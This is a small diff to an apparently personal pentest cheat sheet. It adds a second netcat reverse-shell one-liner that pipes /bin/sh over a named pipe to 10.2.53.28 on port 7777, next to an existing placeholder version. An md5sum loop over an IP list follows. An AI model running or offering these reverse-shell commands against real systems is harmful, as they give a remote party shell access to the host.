@@ -30,6 +30,10 @@ or if no `-e`
 
 `mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker ip listening port > /tmp/f`
 
+or
+
+`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.53.28 7777 >/tmp/f`
+
 ### do things to entires in IPs.txt
 `for ip in `cat ips.txt`; do md5sum $ip; done >> something.txt`
 
